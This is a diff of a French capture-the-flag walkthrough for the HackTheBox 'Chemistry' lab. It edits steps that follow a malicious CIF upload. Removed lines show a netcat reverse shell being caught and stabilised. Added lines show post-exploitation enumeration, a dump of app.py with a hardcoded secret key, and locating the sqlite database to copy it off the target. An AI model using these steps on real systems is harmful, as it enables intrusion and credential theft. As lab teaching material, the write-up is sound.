@@ -627,7 +627,7 @@ Crée un fichier poc-ping.cif
 nano poc-ping.cif
 ```
 
-
+> Note : Les fichiers CIF sont disponibles en téléchargement dans les [Pièces jointes](#pièces-jointes)
 
 ```bash
 data_5yOhtAoR
@@ -675,7 +675,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 0 packets dropped by kernel
 ```
 
-
+> Note : Limite le nombre de pings (ici 5) pour ne pas entrer dans une boucle infinie
 
 ### Reverse Shell
 
@@ -689,33 +689,66 @@ Pour obtenir un `Reverse Shell`, il te suffit de remplacer `system ("ping -c 5 1
 
 **Tu obtiens un Reverse Shell dans la fenêtre Kali que tu n'as plus qu'à stabiliser avec la recette {{< recette "stabiliser-reverse-shell" >}}.**
 
-> Note : Les fichiers CIF sont disponibles en téléchargement dans les [Pièces jointes](#pièces-jointes)
+
 
 ```bash
-nc -lvnp 4444             
+app@chemistry:~$ whoami
+app
+app@chemistry:~$ id
+uid=1001(app) gid=1001(app) groups=1001(app)
+app@chemistry:~$ pwd
+/home/app
+app@chemistry:~$ ls -l
+total 24
+-rw------- 1 app app 5852 Oct  9  2024 app.py
+drwx------ 2 app app 4096 Feb 16 15:30 instance
+drwx------ 2 app app 4096 Oct  9  2024 static
+drwx------ 2 app app 4096 Oct  9  2024 templates
+drwx------ 2 app app 4096 Feb 16 15:40 uploads
+app@chemistry:~$ cat app.py
+from flask import Flask, render_template, request, redirect, url_for, flash
+from werkzeug.utils import secure_filename
+from flask_sqlalchemy import SQLAlchemy
+from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
+from pymatgen.io.cif import CifParser
+import hashlib
+import os
+import uuid
 
-listening on [any] 4444 ...
-connect to [10.10.16.90] from (UNKNOWN) [10.129.8.155] 43024
-sh: 0: can't access tty; job control turned off
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-app@chemistry:~$ ^Z
-zsh: suspended  nc -lvnp 4444
-                                                                      
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
-└─$ stty raw -echo; fg
-[1]  + continued  nc -lvnp 4444
-                               export TERM=xterm  
-app@chemistry:~$ stty cols 132 rows 34
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
+app.config['UPLOAD_FOLDER'] = 'uploads/'
+app.config['ALLOWED_EXTENSIONS'] = {'cif'}
+
+db = SQLAlchemy(app)
+login_manager = LoginManager(app)
+login_manager.login_view = 'login'
+
+[...]
+
+if __name__ == '__main__':
+    with app.app_context():
+        db.create_all()
+    app.run(host='0.0.0.0', port=5000)
 app@chemistry:~$
 ```
 
-### Eploitation du Reverse Shell
+Tu constates que le listing de l'application app.py mentionne **existence d'une base de données `sqlite`** 
 
+```python
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
+```
 
+Tu peux la chercher avec
 
+```bash
+find / -type f -iname "database.db" 2>/dev/null
 
+/home/app/instance/database.db
+```
 
-
+Télécharge `database.db` sur to Kali (recette  {{< recette "copier-fichiers-kali" >}})
 
 ------
 
